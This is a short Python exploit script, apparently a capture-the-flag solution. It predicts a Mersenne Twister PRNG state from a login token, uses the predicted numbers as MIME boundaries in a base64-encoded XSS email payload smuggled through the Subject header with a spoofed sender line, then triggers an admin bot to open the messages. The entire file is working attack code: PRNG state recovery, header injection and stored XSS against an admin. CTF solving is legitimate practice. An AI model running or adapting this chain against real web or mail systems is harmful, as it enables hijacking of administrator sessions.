import base64
from utils import *
from solve import *
import sys
def pad(token):
    _width = len(repr(sys.maxsize - 1))
    _fmt = '%%0%dd' % _width
    boundary = ('=' * 15) + (_fmt % token) + '=='
    return boundary
def encode(token):
    boundary = pad(token)
    b64ed=base64.b64encode(open("xss.eml").read().replace("NUMBER",boundary).encode()).decode()
    subject=f"AA =?utf-8?b?{b64ed}?=\n\nFrom : admin@ses"#From : admin@ses
    return subject
def get_number(ss,i):
    return temper(guess(ss[i], ss[i+1], ss[i+397])) | ((temper(guess(ss[i+1], ss[i+2], ss[i+398])) >> 1) << 32)
def solve():
    token=login()
    ss=guess_state(token)
    print(ss)
    for i in range(2,624,2*(1+2+2)):
        send_email("admin@ses", encode(get_number(ss,i)), "", token)
        admin_bot(token)
        admin_bot(token)
        time.sleep(0.5)
#solve()
solve()